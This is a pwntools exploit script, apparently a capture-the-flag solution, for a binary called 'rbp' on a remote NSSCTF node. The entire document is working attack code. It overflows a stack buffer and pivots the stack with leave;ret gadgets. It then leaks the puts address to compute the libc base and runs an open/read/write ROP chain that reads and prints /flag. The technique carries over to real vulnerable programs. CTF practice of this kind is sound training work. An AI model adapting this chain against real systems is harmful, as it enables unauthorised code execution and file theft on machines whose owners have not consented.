from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./rbp")
io=remote("node2.anna.nssctf.cn",28341)
elf=ELF("./rbp")
libc=ELF("./libc-2.31.so")

pop_rdi=0x401353
leave_ret=0x40121d
read_text=0x401292
puts_got=elf.got[b"puts"]
puts_plt=elf.plt[b"puts"]

payload=cyclic(0x210)+p64(0x404910)+p64(read_text)
io.sendafter(b"try it\n",payload)


payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401270)
payload=payload.ljust(0x210,b"a")+p64(0x404910-0x210)+p64(leave_ret)
io.send(payload)

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("leak_addr: "+hex(leak_addr))

open_a=leak_addr+libc.sym[b"open"]
read_a=leak_addr+libc.sym[b"read"]
write_a=leak_addr+libc.sym[b"write"]
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92

# gdb.attach(io)
# pause()

payload=cyclic(0x210)+p64(0x404498)+p64(read_text)
io.sendafter(b"try it\n",payload)

#open
orw=b"/flag\x00\x00\x00"+p64(pop_rdi)+p64(0x404288)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(write_a)

orw=orw.ljust(0x210,b"a")+p64(0x404490-0x208)+p64(leave_ret)
io.send(orw)

io.interactive()